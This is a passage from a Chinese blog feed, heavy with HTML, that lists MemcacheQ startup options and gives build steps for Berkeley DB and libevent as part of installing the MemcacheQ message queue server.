          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>/</span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>bin</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>/</span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>memcacheq</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'></span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>-</span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>d</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'></span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>-</span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>uroot</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'></span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>-</span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>r</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'></span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>-</span> 
          <span style='font-family: inherit; font-size: inherit !important;'>l</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'></span> 
          <span style='font-family: inherit; color: rgb(206, 0, 0) !important; font-size: inherit !important;'>127.0.0.1</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'></span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>-</span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>p11210</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'></span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>-</span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>H</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'></span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>/</span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>usr</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>/</span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>local</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>/</span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>mcq</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'></span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>-</span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>N</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'></span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>-</span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>R</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'></span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>-</span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>v</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'></span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>-</span> 
          <span style='font-family: inherit; font-size: inherit !important;'>L</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'></span> 
          <span style='font-family: inherit; color: rgb(206, 0, 0) !important; font-size: inherit !important;'>1024</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'></span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>-</span> 
          <span style='font-family: inherit; font-size: inherit !important;'>B</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'></span> 
          <span style='font-family: inherit; color: rgb(206, 0, 0) !important; font-size: inherit !important;'>1024</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'></span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>&gt;</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'></span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>/</span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>usr</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>/</span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>local</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>/</span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>mcq</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>/</span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>logs</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>/</span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>mcq_error</span> 
          <span style='font-family: inherit; color: rgb(0, 78, 208) !important; font-size: inherit !important;'>.log</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'></span> 
          <span style='font-family: inherit; color: rgb(206, 0, 0) !important; font-size: inherit !important;'>2</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>&gt;</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>&amp;</span> 
          <span style='font-family: inherit; color: rgb(206, 0, 0) !important; font-size: inherit !important;'>1</span> 
         </div> 
        </div></td> 
      </tr> 
     </tbody> 
    </table> 
   </div> 
  </div><p style='background-color: rgb(255, 255, 255); font-size: 18px; font-weight: normal;'>附：MemcacheQ参数</p> 
  <div data-settings=' minimize scroll-mouseover disable-anim' style='font-family: Monaco, MonacoRegular, 'Courier New', monospace; font-weight: 500; background-color: rgb(253, 253, 253) !important; font-size: 12px !important;'> 
   <div> 
    <table border='1' cellpadding='2' cellspacing='0' style='font-size: 12px;'> 
     <tbody> 
      <tr> 
       <td data-settings='show' style='background-color: rgb(223, 239, 255) !important; color: rgb(84, 153, 222) !important;'> 
        <div> 
         <div data-line='crayon-5525edf2dcb70289780819-1' style='font-family: inherit; text-align: center; font-size: inherit !important;'>
           1 
         </div> 
         <div data-line='crayon-5525edf2dcb70289780819-2' style='font-family: inherit; text-align: center; background-color: rgb(200, 225, 250) !important; color: rgb(49, 124, 197) !important; font-size: inherit !important;'>
           2 
         </div> 
         <div data-line='crayon-5525edf2dcb70289780819-3' style='font-family: inherit; text-align: center; font-size: inherit !important;'>
           3 
         </div> 
         <div data-line='crayon-5525edf2dcb70289780819-4' style='font-family: inherit; text-align: center; background-color: rgb(200, 225, 250) !important; color: rgb(49, 124, 197) !important; font-size: inherit !important;'>
           4 
         </div> 
         <div data-line='crayon-5525edf2dcb70289780819-5' style='font-family: inherit; text-align: center; font-size: inherit !important;'>
           5 
         </div> 
         <div data-line='crayon-5525edf2dcb70289780819-6' style='font-family: inherit; text-align: center; background-color: rgb(200, 225, 250) !important; color: rgb(49, 124, 197) !important; font-size: inherit !important;'>
           6 
         </div> 
         <div data-line='crayon-5525edf2dcb70289780819-7' style='font-family: inherit; text-align: center; font-size: inherit !important;'>
           7 
         </div> 
         <div data-line='crayon-5525edf2dcb70289780819-8' style='font-family: inherit; text-align: center; background-color: rgb(200, 225, 250) !important; color: rgb(49, 124, 197) !important; font-size: inherit !important;'>
           8 
         </div> 
         <div data-line='crayon-5525edf2dcb70289780819-9' style='font-family: inherit; text-align: center; font-size: inherit !important;'>
           9 
         </div> 
         <div data-line='crayon-5525edf2dcb70289780819-10' style='font-family: inherit; text-align: center; background-color: rgb(200, 225, 250) !important; color: rgb(49, 124, 197) !important; font-size: inherit !important;'>
           10 
         </div> 
         <div data-line='crayon-5525edf2dcb70289780819-11' style='font-family: inherit; text-align: center; font-size: inherit !important;'>
           11 
         </div> 
         <div data-line='crayon-5525edf2dcb70289780819-12' style='font-family: inherit; text-align: center; background-color: rgb(200, 225, 250) !important; color: rgb(49, 124, 197) !important; font-size: inherit !important;'>
           12 
         </div> 
         <div data-line='crayon-5525edf2dcb70289780819-13' style='font-family: inherit; text-align: center; font-size: inherit !important;'>
           13 
         </div> 
         <div data-line='crayon-5525edf2dcb70289780819-14' style='font-family: inherit; text-align: center; background-color: rgb(200, 225, 250) !important; color: rgb(49, 124, 197) !important; font-size: inherit !important;'>
           14 
         </div> 
        </div></td> 
       <td style='width: 673px;'> 
        <div> 
         <div style='font-family: inherit; font-size: inherit !important;'> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>-</span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>p</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'></span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>&lt;</span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>num</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>&gt;</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span> 
          <span style='font-family: inherit; font-size: inherit !important;'>TCP</span>监听端口 
          <span style='font-family: inherit; color: rgb(51, 51, 51) !important; font-size: inherit !important;'>(</span> 
          <span style='font-family: inherit; color: rgb(128, 0, 128) !important; font-size: inherit !important;'>default</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>:</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'></span> 
          <span style='font-family: inherit; color: rgb(206, 0, 0) !important; font-size: inherit !important;'>22201</span> 
          <span style='font-family: inherit; color: rgb(51, 51, 51) !important; font-size: inherit !important;'>)</span> 
         </div> 
         <div style='font-family: inherit; background-color: rgb(247, 247, 247) !important; font-size: inherit !important;'> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>-</span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>U</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'></span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>&lt;</span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>num</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>&gt;</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span> 
          <span style='font-family: inherit; font-size: inherit !important;'>UDP</span>监听端口 
          <span style='font-family: inherit; color: rgb(51, 51, 51) !important; font-size: inherit !important;'>(</span> 
          <span style='font-family: inherit; color: rgb(128, 0, 128) !important; font-size: inherit !important;'>default</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>:</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'></span> 
          <span style='font-family: inherit; color: rgb(206, 0, 0) !important; font-size: inherit !important;'>0</span> 
          <span style='font-family: inherit; color: rgb(51, 51, 51) !important; font-size: inherit !important;'>,</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'></span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>off</span> 
          <span style='font-family: inherit; color: rgb(51, 51, 51) !important; font-size: inherit !important;'>)</span> 
         </div> 
         <div style='font-family: inherit; font-size: inherit !important;'> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>-</span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>s</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'></span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>&lt;</span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>file</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>&gt;</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>&nbsp;&nbsp;&nbsp;&nbsp; </span> 
          <span style='font-family: inherit; color: rgb(0, 78, 208) !important; font-size: inherit !important;'>unix </span> 
          <span style='font-family: inherit; font-size: inherit !important;'>socket</span>路径 
          <span style='font-family: inherit; color: rgb(51, 51, 51) !important; font-size: inherit !important;'>(</span>不支持网络 
          <span style='font-family: inherit; color: rgb(51, 51, 51) !important; font-size: inherit !important;'>)</span> 
         </div> 
         <div style='font-family: inherit; background-color: rgb(247, 247, 247) !important; font-size: inherit !important;'> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>-</span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>a</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'></span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>&lt;</span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>mask</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>&gt;</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>&nbsp;&nbsp;&nbsp;&nbsp; </span> 
          <span style='font-family: inherit; color: rgb(0, 78, 208) !important; font-size: inherit !important;'>unix </span> 
          <span style='font-family: inherit; font-size: inherit !important;'>socket</span>访问掩码 
          <span style='font-family: inherit; color: rgb(51, 51, 51) !important; font-size: inherit !important;'>(</span> 
          <span style='font-family: inherit; color: rgb(128, 0, 128) !important; font-size: inherit !important;'>default</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'></span> 
          <span style='font-family: inherit; color: rgb(206, 0, 0) !important; font-size: inherit !important;'>0700</span> 
          <span style='font-family: inherit; color: rgb(51, 51, 51) !important; font-size: inherit !important;'>)</span> 
         </div> 
         <div style='font-family: inherit; font-size: inherit !important;'> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>-</span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>l</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'></span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>&lt;</span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>ip_addr</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>&gt;</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>&nbsp;&nbsp;</span>监听网卡 
         </div> 
         <div style='font-family: inherit; background-color: rgb(247, 247, 247) !important; font-size: inherit !important;'> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>-</span> 
          <span style='font-family: inherit; font-size: inherit !important;'>d</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span>守护进程 
         </div> 
         <div style='font-family: inherit; font-size: inherit !important;'> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>-</span> 
          <span style='font-family: inherit; font-size: inherit !important;'>r</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span>最大化核心文件限制 
         </div> 
         <div style='font-family: inherit; background-color: rgb(247, 247, 247) !important; font-size: inherit !important;'> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>-</span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>u</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'></span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>&lt;</span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>username</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>&gt;</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'></span>以用户身份运行 
          <span style='font-family: inherit; color: rgb(51, 51, 51) !important; font-size: inherit !important;'>(</span> 
          <span style='font-family: inherit; color: rgb(0, 78, 208) !important; font-size: inherit !important;'>only </span> 
          <span style='font-family: inherit; color: rgb(0, 78, 208) !important; font-size: inherit !important;'>when </span> 
          <span style='font-family: inherit; color: rgb(0, 78, 208) !important; font-size: inherit !important;'>run </span> 
          <span style='font-family: inherit; color: rgb(128, 0, 128) !important; font-size: inherit !important;'>as</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'></span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>root</span> 
          <span style='font-family: inherit; color: rgb(51, 51, 51) !important; font-size: inherit !important;'>)</span> 
         </div> 
         <div style='font-family: inherit; font-size: inherit !important;'> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>-</span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>c</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'></span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>&lt;</span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>num</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>&gt;</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span>最大并发连接数 
          <span style='font-family: inherit; color: rgb(51, 51, 51) !important; font-size: inherit !important;'>(</span> 
          <span style='font-family: inherit; color: rgb(128, 0, 128) !important; font-size: inherit !important;'>default</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'></span> 
          <span style='font-family: inherit; color: rgb(128, 0, 128) !important; font-size: inherit !important;'>is</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'></span> 
          <span style='font-family: inherit; color: rgb(206, 0, 0) !important; font-size: inherit !important;'>1024</span> 
          <span style='font-family: inherit; color: rgb(51, 51, 51) !important; font-size: inherit !important;'>)</span> 
         </div> 
         <div style='font-family: inherit; background-color: rgb(247, 247, 247) !important; font-size: inherit !important;'> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>-</span> 
          <span style='font-family: inherit; font-size: inherit !important;'>v</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span>详细输出 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'></span> 
          <span style='font-family: inherit; color: rgb(51, 51, 51) !important; font-size: inherit !important;'>(</span> 
          <span style='font-family: inherit; color: rgb(0, 78, 208) !important; font-size: inherit !important;'>print </span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>errors</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>/</span> 
          <span style='font-family: inherit; color: rgb(0, 78, 208) !important; font-size: inherit !important;'>warnings </span> 
          <span style='font-family: inherit; color: rgb(128, 0, 128) !important; font-size: inherit !important;'>while</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'></span> 
          <span style='font-family: inherit; color: rgb(128, 0, 128) !important; font-size: inherit !important;'>in</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'></span> 
          <span style='font-family: inherit; color: rgb(0, 78, 208) !important; font-size: inherit !important;'>event </span> 
          <span style='font-family: inherit; color: rgb(0, 45, 122) !important; font-size: inherit !important;'>loop</span> 
          <span style='font-family: inherit; color: rgb(51, 51, 51) !important; font-size: inherit !important;'>)</span> 
         </div> 
         <div style='font-family: inherit; font-size: inherit !important;'> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>-</span> 
          <span style='font-family: inherit; font-size: inherit !important;'>vv</span> 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>更详细的输出 
          <span style='font-family: inherit; color: rgb(0, 111, 224) !important; font-size: inherit !important;'></span> 
          <span style='font-family: inherit; color: rgb(51, 51, 51) !important; font-size: inherit !important;'>(</span> 
          <span style=']]></description>
	<pubDate>Wed, 08 Apr 2015 22:00:00 +0000</pubDate>
	<author>迷茫者</author>
	<guid>http://onelose.com/post-209.html</guid>

</item>
<item>
	<title>MemcacheQ是一个基于MemcacheDB的消息队列服务器。官网地址：http://memca</title>
	<link>http://onelose.com/post-206.html</link>
	<description><![CDATA[
 <div> 
 <p style='background-color: rgb(255, 255, 255); font-family: Arial;'><strong>MemcacheQ 是一个基于 MemcacheDB 的消息队列服务器。</strong>官网地址：<a href='http://memcachedb.org/memcacheq/' target='_blank' style='color: rgb(202, 0, 0);'>http://memcachedb.org/memcacheq/</a></p> 
 <p style='background-color: rgb(255, 255, 255); font-family: Arial;'><br></p> 
 <p style='background-color: rgb(255, 255, 255); font-family: Arial;'><strong>特点：</strong></p> 
 <p style='background-color: rgb(255, 255, 255); font-family: Arial;'>1.简单易用。</p> 
 <p style='background-color: rgb(255, 255, 255); font-family: Arial;'>2.处理速度快。</p> 
 <p style='background-color: rgb(255, 255, 255); font-family: Arial;'>3.可创建多条队列。</p> 
 <p style='background-color: rgb(255, 255, 255); font-family: Arial;'>4.并发性能高。</p> 
 <p style='background-color: rgb(255, 255, 255); font-family: Arial;'>5.与memcache协议兼容。</p> 
 <p style='background-color: rgb(255, 255, 255); font-family: Arial;'>MemcacheQ 依赖 Berkeley DB 和 libevent（1.4 或更高）。</p> 
 <p style='background-color: rgb(255, 255, 255); font-family: Arial;'>Berkeley DB用于持久化存储队列数据，避免当MemcacheQ崩溃或服务器死机时发生数据丢失。</p> 
 <p style='background-color: rgb(255, 255, 255); font-family: Arial;'><br></p> 
 <h1 style='background-color: rgb(255, 255, 255); font-family: Arial;'><strong><span style='font-size:14px;'><span style='color:rgb(255, 0, 0);'>1.安装Berkeley DB</span></span></strong></h1> 
 <p style='background-color: rgb(255, 255, 255); font-family: Arial;'>下载地址：<a href='http://www.oracle.com/technetwork/database/database-technologies/berkeleydb/downloads/index.html?ssSourceSiteId=ocomcn' target='_blank' style='color:rgb(202, 0, 0);'>http://www.oracle.com/technetwork/database/database-technologies/berkeleydb/downloads/index.html?ssSourceSiteId=ocomcn</a></p> 
 <div style='background-color: rgb(231, 229, 220); font-family: Consolas, 'Courier New', Courier, mono, serif; font-size: 12px;'> 
  <div style='background-color: rgb(248, 248, 248); color: silver; font-family: Verdana, Geneva, Arial, Helvetica, sans-serif; font-size: 9px;'> 
   <b>[plain]</b>&nbsp; 
   <a title='view plain' href='http://blog.csdn.net/fdipzone/article/details/17933673#' style='color: rgb(160, 160, 160);'>view plain</a> 
   <a title='copy' href='http://blog.csdn.net/fdipzone/article/details/17933673#' style='color: rgb(160, 160, 160);'>copy</a> 
   <a title='在CODE上查看代码片' href='https://code.csdn.net/snippets/145240' target='_blank' style='color: rgb(160, 160, 160);'><img src='http://note.youdao.com/yws/res/2842/0AD447A0E9F44812B4F7C94A057ABC0C' alt='在CODE上查看代码片' width='12' height='12' data-media-type='image'></a> 
   <a title='派生到我的代码片' href='https://code.csdn.net/snippets/145240/fork' target='_blank' style='color: rgb(160, 160, 160);'><img src='https://code.csdn.net/assets/ico_fork.svg' alt='派生到我的代码片' width='12' height='12' data-media-type='image'></a> 
  </div> 
  <ol start='1' style='background-color:rgb(255, 255, 255);color:rgb(92, 92, 92);'> 
   <li style='background-color:rgb(255, 255, 255);color:inherit;'><span style='color: black;'>$tar&nbsp;xvzf&nbsp;db-6.0.20.tar.gz&nbsp;&nbsp;</span></li> 
   <li style='background-color: rgb(248, 248, 248);'><span style='color: black;'>$cd&nbsp;db-6.0.20/&nbsp;&nbsp;</span></li> 
   <li style='background-color:rgb(255, 255, 255);color:inherit;'><span style='color: black;'>$cd&nbsp;build_unix/&nbsp;&nbsp;</span></li> 
   <li style='background-color: rgb(248, 248, 248);'><span style='color: black;'>$../dist/configure&nbsp;&nbsp;</span></li> 
   <li style='background-color:rgb(255, 255, 255);color:inherit;'><span style='color: black;'>$make&nbsp;&nbsp;</span></li> 
   <li style='background-color: rgb(248, 248, 248);'><span style='color: black;'>$sudo&nbsp;make&nbsp;install&nbsp;&nbsp;</span></li> 
  </ol> 
 </div> 
 <br style='background-color: rgb(255, 255, 255); font-family: Arial;'> 
 <h1 style='background-color: rgb(255, 255, 255); font-family: Arial;'><strong><span style='font-size:14px;'><span style='color:rgb(255, 0, 0);'>2.安装libevent</span></span></strong></h1> 
 <p style='background-color: rgb(255, 255, 255); font-family: Arial;'>下载地址：<a href='http://libevent.org/' target='_blank' style='color:rgb(202, 0, 0);'>http://libevent.org/</a></p> 
 <div style='background-color: rgb(231, 229, 220); font-family: Consolas, 'Courier New', Courier, mono, serif; font-size: 12px;'> 
  <div style='background-color: rgb(248, 248, 248); color: silver; font-family: Verdana, Geneva, Arial, Helvetica, sans-serif; font-size: 9px;'> 
   <b>[plain]</b>&nbsp; 
   <a title='view plain' href='http://blog.csdn.net/fdipzone/article/details/17933673#' style='color: rgb(160, 160, 160);'>view plain</a> 
   <a title='copy' href='http://blog.csdn.net/fdipzone/article/details/17933673#' style='color: rgb(160, 160, 160);'>copy</a> 
   <a title='在CODE上查看代码片' href='https://code.csdn.net/snippets/145240' target='_blank' style='color: rgb(160, 160, 160);'><img src='http://note.youdao.com/yws/res/2842/0AD447A0E9F44812B4F7C94A057ABC0C' alt='在CODE上查看代码片' width='12' height='12' data-media-type='image'></a> 
   <a title='派生到我的代码片' href='https://code.csdn.net/snippets/145240/fork' target='_blank' style='color: rgb(160, 160, 160);'><img src='https://code.csdn.net/assets/ico_fork.svg' alt='派生到我的代码片' width='12' height='12' data-media-type='image'></a> 
  </div> 
  <ol start='1' style='background-color:rgb(255, 255, 255);color:rgb(92, 92, 92);'> 
   <li style='background-color:rgb(255, 255, 255);color:inherit;'><span style='color: black;'>$tar&nbsp;xvzf&nbsp;libevent-2.0.21-stable.tar.gz&nbsp;&nbsp;</span></li> 
   <li style='background-color: rgb(248, 248, 248);'><span style='color: black;'>$cd&nbsp;libevent-2.0.21-stable&nbsp;&nbsp;</span></li> 
   <li style='background-color:rgb(255, 255, 255);color:inherit;'><span style='color: black;'>$./configure&nbsp;&nbsp;</span></li> 
   <li style='background-color: rgb(248, 248, 248);'><span style='color: black;'>$make&nbsp;&nbsp;</span></li> 
   <li style='background-color:rgb(255, 255, 255);color:inherit;'><span style='color: black;'>$sudo&nbsp;make&nbsp;install&nbsp;&nbsp;</span></li> 
  </ol> 
 </div> 
 <span style='background-color: rgb(255, 255, 255); font-family: Arial;'>增加两行到 /etc/ld.so.conf</span> 
 <div style='background-color: rgb(231, 229, 220); font-family: Consolas, 'Courier New', Courier, mono, serif; font-size: 12px;'> 
  <div style='background-color: rgb(248, 248, 248); color: silver; font-family: Verdana, Geneva, Arial, Helvetica, sans-serif; font-size: 9px;'> 
   <b>[plain]</b>&nbsp; 
   <a title='view plain' href='http://blog.csdn.net/fdipzone/article/details/17933673#' style='color: rgb(160, 160, 160);'>view plain</a> 
   <a title='copy' href='http://blog.csdn.net/fdipzone/article/details/17933673#' style='color: rgb(160, 160, 160);'>copy</a> 
